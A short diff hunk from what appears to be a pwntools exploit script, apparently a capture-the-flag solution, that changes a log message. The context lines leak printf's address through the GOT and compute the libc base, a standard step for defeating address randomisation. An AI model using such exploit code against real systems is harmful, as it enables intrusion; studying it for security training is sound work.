@@ -41,7 +41,7 @@ payload += p64(printf_got)
 p.sendline(payload)
 PRINTF = unpack(p.recvuntil(b"|END", drop=True), 'all')
 
-log.success(f"PRINTF: {hex(PRINTF)}")
+log.success(f"PRINTF@LIBC: {hex(PRINTF)}")
 
 # Get libc base
 libc.address = PRINTF - libc.sym['printf']
